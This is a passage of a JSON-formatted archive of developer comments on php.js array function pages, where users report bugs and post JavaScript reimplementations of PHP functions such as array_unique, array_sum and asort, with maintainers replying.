QtScript at least.\n\nChange to [code] tmp_arr = [] [\/code] \n\n... and you get the expected c, b, a\n\nDoes the function need to test on preserve_keys  first as to what [code] temp_arr [\/code] is created as?"},{"date":"2011-09-20 08:42:35","author":"Rafa?","url":"","comment":"@Paul: I changed the function, so it returns Array when preserve_keys is falsy.\nhttps:\/\/github.com\/kvz\/phpjs\/blob\/master\/functions\/array\/array_reverse.js\nI think it was the first and last time I've touched array functions."},{"date":"2012-08-08 17:15:20","author":"Jan Bouvrie","url":"","comment":"Is it me, or is the type change from string '4.0' to numeric 4 in the example a side effect?"}],"array_search":[{"date":"2012-04-30 17:12:56","author":"CoursesWeb","url":"http:\/\/www.coursesweb.net","comment":"Hi,\nFor a simple array_search function, without the third parameter, i use made this variant (works with array and objects:\n[code]\nfunction array_search(val, array) {\n  if(typeof(array) === 'array' || typeof(array) === 'object') {\n    for(var indice in array) {\n      if(array[indice] == val) break;\n    }\n    if(indice) return indice;\n  }\n}\n[\/code]"},{"date":"2012-04-30 18:08:28","author":"CoursesWeb","url":"http:\/\/www.coursesweb.net","comment":"Hi,\nThis is a comment to correct the function posted below.\nThat function has an error, it returns the last key, eaven the value not match.\nSorry, here's the corrected version:\n[code]\nfunction array_search(val, array) {\n  if(typeof(array) === 'array' || typeof(array) === 'object') {\n    var rekey;\n    for(var indice in array) {\n      if(array[indice] == val) {\n        rekey = indice;\n        break;\n      }\n    }\n    return rekey;\n  }\n}\n[\/code]"}],"array_shift":[{"date":"2008-04-07 06:41:09","author":"Post cannot have an empty name","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction array_shift(array)\r\n{\r\n    element = array[0];\r\n    array.shift(array);\r\n    return element;\r\n}\r\n[\/CODE]"},{"date":"2008-04-07 11:30:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Post cannot have an empty name: I agree that this function could probably be trimmed down a bit, but your version does not support  associative arrays, so for now I'm going to have to stick with the current version. Do you agree? Thanks for your input, and if you have a different opinion or code, let me know!"},{"date":"2008-05-21 17:13:47","author":"Buzz","url":"","comment":"array_shift(['Kevin', 'van', 'Zonneveld']);\r\nshould return \r\narray('van','Zonneveld');\r\n3178"},{"date":"2008-05-21 18:47:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Buzz: I do not agree. The original array is changed by reference. But the function should return what has been removed: the value of the first element."},{"date":"2008-05-30 13:07:13","author":"Martijn Wieringa","url":"","comment":"It turns out that 'shift' and 'unshift' functions are  supported by JS itself (tested in IE 6 and FF 2)\r\n\r\n[CODE=\"Javascript\"]\r\nfunction array_shift(f_array)\r\n{\r\n\tif(f_array.length > 0)\r\n\t{\r\n\t\treturn f_array.shift();\r\n\t}\r\n \r\n\treturn null;\r\n}\r\n\r\nfunction array_unshift(f_array)\r\n{\r\n\tfor(var i = 1; i < array_unshift.arguments.length; i++)\r\n\t{\r\n\t\tf_array.unshift(array_unshift.arguments[i]);\r\n\t}\r\n\r\n\treturn (array_unshift.arguments.length - 1);\r\n}[\/CODE]"},{"date":"2008-05-31 14:45:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Martijn Wieringa: Nice! Thanks for taking the time to test it and write wrappers as well!"}],"array_slice":[{"date":"2012-04-18 10:18:01","author":"????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"I agree it is a very informative article and I actually enjoy reading good stuff unlike all the crap out there on the internet \n"},{"date":"2012-07-30 01:28:29","author":"Evelus","url":"http:\/\/evel.us\/","comment":"Fantastic, thanks! Been trying to figure out the best way to slice clientside."}],"array_splice":[{"date":"2012-05-06 09:42:06","author":"????? ????","url":"http:\/\/girlsgames.an3m1.com\/","comment":"Very good article I will follow up all that is new and you are always in constant progress in all that you offer great articles\n"}],"array_sum":[{"date":"2008-08-05 00:10:13","author":"Nosredna","url":"","comment":"I don't like that array_sum uses for\/in. Makes the loop slow and leads to other properties of the array besides the numbered elements being picked up. For arrays, a normal for loop is more appropriate. I'm curious why for\/in was chosen. To deal with sparse arrays? Anyway, seems like a bug to me.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\narr=[1,2,3,4];\r\narr.other=5;\r\n\r\nalert(array_sum(arr));\r\n[\/CODE]\r\n\r\nI'd prefer that alert 10 rather than 15."},{"date":"2008-08-27 16:57:11","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nosredna: Thank you for your input. For many different reasons we've chosen to mimic PHP's behavior as much as possible. And as you can see: http:\/\/www.php.net\/array_sum , PHP does not differentiate between numerically indexed arrays and 'associative arrays' (in JavaScript, known as objects). I hope this answers your question."},{"date":"2008-11-19 06:28:17","author":"Nate","url":"","comment":"The variable &quot;key&quot; is declared twice with &quot;var&quot;.  Probably the &quot;var&quot; in the for loop should be removed."},{"date":"2008-11-25 17:07:38","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nate: Thanks!"},{"date":"2009-01-05 21:11:16","author":"Gilbert","url":"www.midiaprata.com.br","comment":"Hi!\r\n\r\nI tryng this code \r\n\r\n[CODE=&quot;Javascript&quot;]\r\ntotalPedidos = new Array;\r\nindex = 0.1;\r\n\r\n\tfor(y=0; y &lt; 12; y++){\r\n\t\ttotalPedidos[y] = y * index;\r\n\t}\r\n\r\ndocument.writeln(array_sum(totalPedidos));\r\n[\/CODE]\r\n\r\nand return this &gt;&gt;\r\n00.10.20.300000000000000040.40.50.60000000000000010.70000000000000010.80.911.1"},{"date":"2009-01-05 22:19:44","author":"Gilbert","url":"www.midiaprata.com.br","comment":"I resolve my problem \r\n\r\nEdit \r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_sum( array ) {\r\n    \/\/ Calculate the sum of values in an array\r\n    \/\/ \r\n    \/\/ +    discuss at: http:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_array_sum\/\r\n    \/\/ +       version: 811.2517\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +   bugfixed by: Nate\r\n    \/\/ *     example 1: array_sum([4, 9, 182.6]);\r\n    \/\/ *     returns 1: 195.6\r\n\r\n    var key, sum= parseInt(0);\r\n\r\n    \/\/ input sanitation\r\n    if( !array || (array.constructor !== Array &amp;&amp; array.constructor !== Object) || !array.length ){\r\n        return null;\r\n    }\r\n\r\n    for(key in array){\r\n        sum += (array[key]) * 1 ;\r\n    }\r\n\r\n    return sum;\r\n}\r\n\r\n[\/CODE]\r\n\r\n[CODE=&quot;Javascript&quot;]\r\ntotalPedidos = new Array;\r\nindex = 0.3;\r\n\r\n\tfor(y=0; y &lt; 12; y++){\r\n\t\ttotalPedidos[y] = y + index;\r\n\t}\r\n\r\ndocument.writeln(array_sum(totalPedidos));\r\n\r\n[\/CODE]\r\n\r\nResult = 69.6"},{"date":"2009-01-06 17:21:48","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Gilbert: Thanks for sharing! I think the problem was:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\ntotal = Array\r\n[\/CODE]\r\n\r\ninstead of\r\n\r\n[CODE=&quot;Javascript&quot;]\r\ntotal = new Array \/\/ or total = []\r\n[\/CODE]\r\n\r\nBut a little extra input sanitation wouldn't hurt!"},{"date":"2011-11-12 12:27:44","author":"David Pilia","url":"www.beteck.it","comment":"Hi,\nI fix this code with a typeof control in the for cicle\n[CODE]\nfor (key in array) {\n        if ( parseFloat(array[key]).toString() == 'NaN' ) continue;\n        sum += parseFloat(array[key]);\n    }\n[\/CODE]\n\nIn this mode any other type of content of the array\nare skipped.\n\nExample:\n[CODE]array_sums([4, 1, 'abc', '12.3', 3, 2]);[\/CODE]\n\nreturn 22.3 = 4+1+12.3+3+2; \/\/ abc is skipped and 12.3 converted to float\n\nBye!"},{"date":"2012-04-18 10:18:35","author":"????? ????????","url":"http:\/\/an3m1.com\/","comment":"Great job here. I really enjoyed what you had to say. Keep going because you definitely bring a new voice to this subject. Not many people would say what you\u2019ve said and still make it interesting \n \n\n"},{"date":"2012-06-21 17:40:59","author":"chris","url":"","comment":"isn't this more simple and functional?\n[CODE]\nfunction sum (array) { return array.reduce(function (a, b) { return a + b; })}\n\nsum([1,2,3])\n[\/CODE]"},{"date":"2012-06-21 19:53:33","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@chris: Yes, but \n\n1) reduce() is not available to older browsers, and \n2) it does not work on regular objects which phpjs allows in place of associative arrays (or the ordered associative arrays which I have now added support for in Git). \n\nThe latter works as a method of our custom PHPJS_Array's (returnable optionally by the array() function) to ensure something resembling an associative array can be created in JS while still being orderable:\n\nini_set('phpjs.return_phpjs_arrays', 'on');\nvar a = array({a:2}, {b:3}, {c:4}); \/\/ represents an ordered version of {a:2, b:3, c:4} (not needed with sum(), but of relevance with other ordered arrays)\na.sum();\n\/\/ 9\n\n\/\/ Or this:\narray_sum(a);\n\/\/ 9"},{"date":"2012-07-04 15:44:07","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@David Pilia: Thanks for the PHP-like behavior. Applied in Git (though slightly simplified). Also applied in optional array() methods."}],"array_uintersect":[{"date":"2012-07-19 11:59:08","author":"Demosthenes Koptsis","url":"","comment":"it should be \n[CODE]\ncb = arguments[arglm1]\n[\/CODE]\nnot\ncb = arguments[argm1]"},{"date":"2012-07-19 12:42:26","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Demosthenes Koptsis: Fixed in Git, thanks!"}],"array_uintersect_assoc":[{"date":"2012-07-19 12:17:21","author":"Demosthenes Koptsis","url":"","comment":"i think\narglm2 = arglm1 - 2\nshould be\narglm2 = arglm1 - 1"}],"array_uintersect_uassoc":[{"date":"2009-05-29 02:18:34","author":"wat","url":"","comment":"LOL"}],"array_unique":[{"date":"2008-04-30 12:27:53","author":"duncan","url":"","comment":"maybe i'm being stupid, but PHP array_unique returns an array, not a boolean.\r\n&quot;Takes an input array  and returns a new array without duplicate values.&quot;"},{"date":"2008-05-02 11:34:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ duncan: You were not being stupid, we were. Thank you for noticing! The fixed version will be visible shortly."},{"date":"2008-06-13 19:45:26","author":"goshki","url":"","comment":"Well, there seems to be some kind of a problem with this function. Running:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\narray_unique(['a','b','c','a','b','c','a','b','c']);\r\n[\/CODE]\r\n\r\nreturns:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n['a','a','b','c']\r\n[\/CODE]"},{"date":"2008-06-16 00:16:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ goshki: You're right, it seems that our current version doesn't support associative arrays (javascript objects). Since PHP doesn't distinct those, we need to work on a version that does support objects. It's on my todo list. Thank your for noticing!"},{"date":"2008-07-24 09:47:36","author":"sankai","url":"","comment":"Running:\r\n[CODE=&quot;Javascript&quot;]\r\narray_unique(['Kevin','Kevin','van','Kevin']);\r\n[\/CODE]\r\nReturn:\r\n[CODE=&quot;Javascript&quot;]\r\n['Kevin','van','Kevin']\r\n[\/CODE]\r\nIt's the same problem as @goshki ?"},{"date":"2008-07-24 10:05:47","author":"sankai","url":"","comment":"Hi,I try to write a code for array_unique() as the following:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_unique(array){\r\n    var tem_arr = new Array();\r\n    for(i=0;i&lt;array.length;i++){\r\n        if(!in_array(array[i],tem_arr)){\r\n            tem_arr[i]=array[i];\r\n        }\r\n    }\r\n    return tem_arr.join(',').split(',');\r\n}\r\n[\/CODE]\r\nNOTE:It's require function in_array()"},{"date":"2008-07-25 08:21:01","author":"sankai","url":"","comment":"the code I posted yesterday had big bug!I fixed it as the following:\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_unique(array,numeric){\r\n    \/\/ http:\/\/blog.doublekai.org\/\r\n    \/\/ +   original by: sankai (http:\/\/blog.doublekai.org\/)\r\n    \/\/ *     example 1: array_unique([1,2,3,'1','2','3',1,2,3],true);\r\n    \/\/ *     returns 1: [1,2,3]\r\n    \/\/ *     example 2: array_unique([1,2,3,'1','2','3',1,2,3]);\r\n    \/\/ *     returns 2: [1,2,3,'1','2','3']\r\n    \/\/ *     example 3: array_unique([1,'a','a','1','3',3,'b','c','b',1]);\r\n    \/\/ *     returns 3: [1,'a','1','3',3,'b','c']\r\n    \/\/ *     example 3: array_unique([1,'a','a','1','3',3,'b','c','b',1],true);\r\n    \/\/ *     returns 3: [1,'a',3,'b','c']    \r\n    \/\/ *     NOTE :require function in_array()    \r\n    var tem_arr = new Array();\r\n    for(i=0;i&lt;array.length;i++){\r\n        if(numeric === true &amp;&amp; typeof(array[i]) == 'string' &amp;&amp; !isNaN(array[i])){ \r\n            array[i]=parseInt(array[i],10);\r\n        }\r\n        if(!in_array(array[i],tem_arr)){\r\n                tem_arr[i]=array[i];\r\n        }\r\n    }\r\n    return tem_arr.join(' ').replace(\/\\s{2,}\/g,' ').split(' ');\r\n}\r\n[\/CODE]\r\nThe version need require function in_array\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_unique(array,numeric){\r\n    \/\/ http:\/\/blog.doublekai.org\/\r\n    \/\/ +   original by: sankai (http:\/\/blog.doublekai.org\/)\r\n    \/\/ *     example 1: array_unique([1,2,3,'1','2','3',1,2,3],true);\r\n    \/\/ *     returns 1: [1,2,3]\r\n    \/\/ *     example 2: array_unique([1,2,3,'1','2','3',1,2,3]);\r\n    \/\/ *     returns 2: [1,2,3,'1','2','3']\r\n    \/\/ *     example 3: array_unique([1,'a','a','1','3',3,'b','c','b',1]);\r\n    \/\/ *     returns 3: [1,'a','1','3',3,'b','c']\r\n    \/\/ *     example 3: array_unique([1,'a','a','1','3',3,'b','c','b',1],true);\r\n    \/\/ *     returns 3: [1,'a',3,'b','c']    \r\n    \/\/ *     DON'T NEED require function in_array()    \r\n    var tem_arr = new Array();\r\n    for(i=0;i&lt;array.length;i++){\r\n        if(numeric === true &amp;&amp; typeof(array[i]) == 'string' &amp;&amp; !isNaN(array[i])){ \r\n            array[i]=parseInt(array[i],10);\r\n        }    \r\n        if(tem_arr.length == 0){\r\n            tem_arr[i] = array[i];\r\n        } else {\r\n            var exist = false;\r\n            for(var j=0; j&lt;tem_arr.length; j++){\r\n                if(tem_arr[j] === array[i]){\r\n                    exist = true;\r\n                }\r\n            }\r\n            if(!exist){\r\n                if(array[i] != null){\r\n                    tem_arr[i] = array[i];\r\n                }    \r\n            }\r\n        }\r\n    }\r\n    return tem_arr.join(' ').replace(\/\\s{2,}\/g,' ').split(' ');\r\n}\r\n[\/CODE]\r\nThe version don't need require funciton in_array()"},{"date":"2008-07-25 08:47:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ sankai: Thank you so much! But this array_unique does not support associative arrays (javascript objects). So unlike PHP's implementation, arrays that have non-numeric keys do not work.\r\n\r\nSad to say that my implementation didn't support it either, but I'm looking to replace array_unique with one that does support:\r\n[CODE=&quot;Javascript&quot;]\r\n{firstname: 'Kevin', surname: 'van Zonneveld'}\r\n[\/CODE]\r\n.. style arrays"},{"date":"2008-08-05 00:23:36","author":"Nosredna","url":"","comment":"Stray thought. The nested loops make me wonder how slow this is for large arrays.\r\n\r\nPerhaps you could clone the array, sort the clone, then walk the two arrays deleting the dupes as you go. Sort is probably O(n log n) and maybe it's especially fast when no user sort evaluation routine is passed in."},{"date":"2008-08-27 17:01:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nosredna: That's an idea that calls for a function rewrite. Interested? ;)"},{"date":"2008-11-06 15:46:01","author":"Nate","url":"","comment":"It looks like someone forgot to declare &quot;val&quot; with var.\r\n\r\nI think the first line of code should read:\r\n\r\n[code]\r\n    var key = '', tmp_arr1 = {}, tmp_arr2 = {}, val;\r\n[\/code]\r\n\r\nOtherwise, &quot;val&quot; is a global variable, I believe.\r\n\r\nIs there any benefit to using var in a for loop?  Would it be better to also declare &quot;fkey&quot; with &quot;strict&quot;?\r\n\r\nAlso, I don't know if this is important, but there is no space between &quot;for&quot; and &quot;if&quot; and the opening parentheses in __array_search()."},{"date":"2008-11-09 13:03:39","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nate: Thank you for noticing!"},{"date":"2009-04-13 19:03:58","author":"Michael Grier","url":"","comment":"I found out if you're using this in GreaseMonkey, objects won't return. I changed the tmp_arr declarations to array, and it started working for me.\n\nAlso, regarding the strict var, PHP always does a strict comparison after casting the arguments to strings. So you could do the following:\n\n[CODE]\nif ((haystack[fkey] + \"\") === (needle + \"\")) {\n    return fkey;\n}\n[\/CODE]"},{"date":"2009-04-14 03:23:36","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Ok, I made the strict fix, Michael, in SVN, thank you! \n\nHowever, I'm not sure about the array-to-objects issue. Although we can get an array to return, due to the nature of JS, it will only contain the numerically indexed items within the array (and the length will be the total of those only). The other items would be added as properties of that array's object, and not be counted with length, though they are iteratable. Kevin has chosen to implement PHP arrays as regular (non-array) objects, so that we can support associative arrays. Granted we could theoretically return arrays with object properties, but that might be more confusing, and perhaps is the reason he chose not to do that. \n\nOne solution, might be to detect whether the input array was indeed a genuine array (which could only be numerically indexed), and if so, build a bona fide array as output too, but the problem with that is that the PHP behavior is to preserve keys, and we cannot preserve keys unless we build an object (or delete\/cause to be undefined, those items which are no longer in use, but that still keeps the array length)--the one rare exception where we could safely return a regular array would be if all of the unique items were at the front of the array... So, not any good answers, I suspect, though I imagine you personally should be able to adapt the output of our function to the form you need for Greasemonkey... Best wishes, Brett"},{"date":"2009-04-14 12:41:42","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Great work guys, I'll deploy shortly"},{"date":"2010-02-02 12:43:44","author":"nitin gupta","url":"http:\/\/publicmind.in\/blog","comment":"Hi Kevin,\n\nI do not see this function being dependent on asort, may be a little documentation error.\n\nRegards,"},{"date":"2010-02-04 02:17:15","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@nitin gupta: Thanks--I've fixed it in Git. I think it is a relic of the fact that we noticed that we may still _need_ to sort according to the docs, but I'm a bit busy to look at fixing this now myself."},{"date":"2010-03-19 12:36:02","author":"harald","url":"","comment":"hello,\n\nmay i ask:\n\nlines 25 and 35\n\nwhy are you testing for hasOwnProperty inside the loop and not outside?\n\n"},{"date":"2010-03-19 14:53:14","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@harald: Sorry, fixed in git: http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/array\/array_unique.js . See https:\/\/developer.mozilla.org\/en\/Core_JavaScript_1.5_Reference\/Global_Objects\/Object\/hasOwnProperty for an explanation of the method. It is used to make sure we are only iterating over the immediate properties of the object, and not any that may have been added on an inherited class or on the Object\/Array prototype itself..."},{"date":"2010-03-19 14:55:36","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"But to make clear, it wasn't the position that was the problem, but the lack of an argument...Dumb oversight on my part..."},{"date":"2010-06-08 19:50:09","author":"t","url":"","comment":"Why does this function return an object where as the php version returns an array?\n\nThanks"},{"date":"2010-06-09 21:10:58","author":null,"url":"","comment":"@t: Associative arrays aren't native to JavaScript, but JavaScript objects share similarities to PHP associative arrays, so to try and support associative arrays, the functions on PHP.JS convert JavaScript arrays to JavaScript objects."},{"date":"2011-12-27 02:12:16","author":"Dj","url":"","comment":"I suggest you my version which has two main features compared with your version:\nFirst, its speed; Instead of use array_search which needs to iterate over the collection for each item of the source value, I add the new values as keys (implicity converted to strings for comparision) to a temporary object, then quickly you can check if it was added using hasOwnProperty.\nSecond, a second paramemeter which add the feature of returning the result as array when the source value is an array.\nNote that in this case the array will be re-indexed because in js the keys of the arrays are numeric and needs to be continued.\n[CODE]\nfunction array_unique(inputArr, preserveArray) {\n\tvar key = '',\n\t\tval = '',\n\t\thashT = {},\n\t\tresult;\n\n\tif (preserveArray && (inputArr instanceof Array)) {\n\t\tresult = [];\n\t\tvar length = inputArr && inputArr.length >> 0;\n\t\t\n\t\tfor (key = 0; key < length; ++key) {\n\t\t\tval = inputArr[key];\n\t\t\tif (!hashT.hasOwnProperty(val)) {\n\t\t\t\tresult.push(val);\n\t\t\t\thashT[val] = true;\n\t\t\t}\n\t\t}\n\t\t\n\t} else {\n\t\tresult = {};\n\t\tif (!inputArr) {\n\t\t\treturn result;\n\t\t}\n\t\tfor (key in inputArr) {\n\t\t\tval = inputArr[key];\n\t\t\tif (!hashT.hasOwnProperty(val)) {\n\t\t\t\tresult[key] = val;\n\t\t\t\thashT[val] = true;\n\t\t\t}\n\t\t}\n\t}\n\treturn result;\n}\n[\/CODE]"}],"array_unshift":[{"date":"2010-05-26 12:33:31","author":"jmweb","url":"","comment":"Note that the array_unshift() implementation given here prepends the array arguments in the wrong order.\n\nAs an example:\n[CODE]\nvar names=['van', 'Zonneveld'];\narray_unshift(names,'Kevin','Tim')\n\/\/ returns 4\n\/\/names is now ['Tim','Kevin','van', 'Zonneveld']\n[\/CODE]\n\nThe function should be altered to:\n[CODE]\nfunction array_unshift(\/* assumes at least 1 argument passed - the array *\/){\nvar i=arguments.length;\n     while(--i!==0){\n     arguments[0].unshift(arguments[i]);\n    }\nreturn arguments[0].length;\n}\n[\/CODE]\n\nAs an example:\n[CODE]\nvar names=['van', 'Zonneveld'];\narray_unshift(names,'Kevin','Tim')\n\/\/ returns 4\n\/\/names is now ['Kevin','Tim','van', 'Zonneveld']\n[\/CODE]"},{"date":"2010-06-19 16:04:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ jmweb: Thanks, fixed: https:\/\/github.com\/kvz\/phpjs\/commit\/fc87874f1823862ae2e4b006f9b4316401c65f33\n"}],"array_values":[{"date":"2008-01-22 05:08:02","author":"Ates Goral","url":"","comment":"Here's array_count_values():\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction array_count_values(array) {\r\n    \/\/ *     example 1: array_count_values([ 3, 5, 3, &quot;foo&quot;, &quot;bar&quot;, &quot;foo&quot; ]);\r\n    \/\/ *     returns 1: {3:2, 5:1, &quot;foo&quot;:2, &quot;bar&quot;:1}\r\n    \/\/ *     example 2: array_count_values({ p1: 3, p2: 5, p3: 3, p4: &quot;foo&quot;, p5: &quot;bar&quot;, p6: &quot;foo&quot; });\r\n    \/\/ *     returns 2: {3:2, 5:1, &quot;foo&quot;:2, &quot;bar&quot;:1}\r\n    \/\/ *     example 3: array_count_values([ true, 4.2, 42, &quot;fubar&quot; ]);\r\n    \/\/ *     returns 3: {42:1, &quot;fubar&quot;:1}\r\n\r\n    function countValue(value) {\r\n        switch (typeof(value)) {\r\n        case &quot;number&quot;:\r\n            if (Math.floor(value) != value) {\r\n                return;\r\n            }\r\n        case &quot;string&quot;:\r\n            if (value in this) {\r\n                ++this[value];\r\n            } else {\r\n                this[value] = 1;\r\n            }\r\n        }\r\n    }\r\n    \r\n    var ret = new Object();\r\n    \r\n    if (array instanceof Array) {\r\n        array.forEach(countValue, ret);\r\n    } else if (array instanceof Object) {\r\n        for (var key in array) {\r\n            countValue.call(ret, array[key]);\r\n        }\r\n    }\r\n    \r\n    return ret;\r\n}\r\n[\/CODE]"},{"date":"2008-01-22 08:57:02","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: Great dude!"},{"date":"2010-05-30 03:39:41","author":"Surya Adi Sapoetra","url":"www.namakusurya.com","comment":"i really like phpjs.. thanks..."},{"date":"2012-03-22 13:54:45","author":"???? ????","url":"http:\/\/an3m1.com\/","comment":"News and new recipes world famous in the world of Eve "}],"array_walk":[{"date":"2012-06-18 20:34:46","author":"David","url":"","comment":"Line 21 doesn't make any sense, you are only passing userdata to the function, and userdata is undefined. Line 21 should be:\n[CODE]\neval(funcname + '(array[key] , key)');\n[\/CODE]\n\n"},{"date":"2012-06-21 02:36:37","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@David: Thanks for the fix with the missing userdata argument. I changed it a bit to check for arguments.length (number of arguments passed), since otherwise, it won't allow explicit passing of \"undefined\" as an argument. I also added support for closures and PHP-style object-function arrays, added an option to avoid eval (not on by default since eval() is more PHP-like in allowing calls to built-in functions), and provided support within array() for walk() as a chainable method.\n\nChanges are in Git (see \"raw js source\")."}],"array_walk_recursive":[{"date":"2009-10-02 10:44:06","author":"Roland Hentschel","url":"","comment":"Hi!\n\nWell, the function void() does not really show, how the whole thing works. Couldn't you provide a sample call with a function,\nthat would help me understanding better?\n\nthanx ( -: roland :- )\n"},{"date":"2009-10-08 23:32:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Roland Hentschel: Our examples are also used for unit testing. Hence the strangeness.\nPlease refer to the official PHP documentation for more details on how to operate these functions. "},{"date":"2009-10-13 18:54:55","author":"Basti","url":"www.example.org","comment":"Please prefer prototyping instead of doing something like this. Instead of polluting the users memory...Prototypes are just ONCE instanced in memory, but are applied for every existing array.\r\n\r\nExample:\r\n[CODE]\r\nArray.prototype.myFunction = function (yourArgumentsGoHere) {\r\n \/\/ doWhatever you want to apply \r\n}\r\n[\/CODE]"},{"date":"2009-10-13 18:56:26","author":"Basti","url":"www.example.org","comment":"Please prefer prototyping instead of doing something like this. Instead of polluting the users memory...Prototypes are just ONCE instanced in memory, but are applied for every existing array.\r\n\r\nExample:\r\n[CODE]\r\nArray.prototype.myFunction = function (yourArgumentsGoHere) {\r\n \/\/ doWhatever you want to apply \r\n}\r\n[\/CODE]"}],"arsort":[{"date":"2009-01-17 05:56:01","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry not to think of it earlier... Here are asort() and arsort() updated with sort_flags infrastructure and SORT_REGULAR added. \r\n\r\nSORT_STRING (as well as natsort and natcasesort) might also be integrated into all of these functions by adapting the code at http:\/\/sourcefrog.net\/projects\/natsort\/natcompare.js (note that the URL is not a typo), but I don't know how you want to do it (and it would need a little tweaking, at least for case insensitive sorts, but it is based on the same algorithm used by PHP).\r\n\r\nI've also copied the same infrastructure for sort(), and rsort()  (and sped up rsort())\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction asort(inputArr, sort_flags) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Brett Zamir\r\n    \/\/ %          note: The examples are correct, this is a new way\r\n    \/\/ %          note: Credits to: http:\/\/javascript.internet.com\/math-related\/bubble-sort.html \r\n    \/\/ *     example 1: data = {d: 'lemon', a: 'orange', b: 'banana', c: 'apple'};\r\n    \/\/ *     example 1: asort(data);\r\n    \/\/ *     results 1: data == {c: 'apple', b: 'banana', d: 'lemon', a: 'orange'}\r\n    \/\/ *     returns 1: true\r\n\t\r\n\tvar valArr=[], keyArr=[], k, i, ret, sorter;\r\n\r\n\tswitch (sort_flags) {\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale (set with  i18n_loc_set_default() as of PHP6)\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_NUMERIC': \/\/ compare items numerically\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(a - b);\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t\tcase 'SORT_REGULAR': \/\/ compare items normally (don't change types)\r\n\t\tdefault:\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\tif (a &gt; b)\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\tif (a &lt; b)\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\treturn 0;\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t}\r\n\r\n    var bubbleSort = function(keyArr, inputArr) {\r\n        var i, j, tempValue, tempKeyVal;\r\n        for (i = inputArr.length-2; i &gt;= 0; i--) {\r\n            for (j = 0; j &lt;= i; j++) {\r\n                ret = sorter(inputArr[j+1], inputArr[j]);\r\n                if (ret &gt; 0) {\r\n                    tempValue     = inputArr[j];\r\n                    inputArr[j]   = inputArr[j+1];\r\n                    inputArr[j+1] = tempValue;\r\n                    tempKeyVal    = keyArr[j];\r\n                    keyArr[j]     = keyArr[j+1];\r\n                    keyArr[j+1]   = tempKeyVal;\r\n                }\r\n            }\r\n        }\r\n    };\r\n  \r\n    \/\/ Get key and value arrays\r\n    for (k in inputArr) { \r\n        valArr.push(inputArr[k]);\r\n        keyArr.push(k);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        \/\/ Sort our new temporary arrays\r\n        bubbleSort(keyArr, valArr); \r\n    } catch(e) {\r\n        return false;\r\n    }\r\n \r\n    \/\/ Repopulate the old array\r\n    for (i = 0; i &lt; valArr.length; i++) {  \r\n        inputArr[keyArr[i]] = valArr[i];\r\n    }\r\n    \r\n    return true;\r\n}\r\n\r\nfunction sort (inputArr, sort_flags) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +    revised by: Brett Zamir\r\n    \/\/ *     example 1: sort(['Kevin', 'van', 'Zonneveld']);\r\n    \/\/ *     returns 1: true\r\n    \/\/ *     example 2: fruits = {d: 'lemon', a: 'orange', b: 'banana', c: 'apple'};\r\n    \/\/ *     example 2: sort(fruits);\r\n    \/\/ *     returns 2: true\r\n    \/\/ *     results 2: fruits == {0: 'apple', 1: 'banana', 2: 'lemon', 3: 'orange'}\r\n \r\n    var valArr = [], keyArr=[];\r\n    var k = '', i 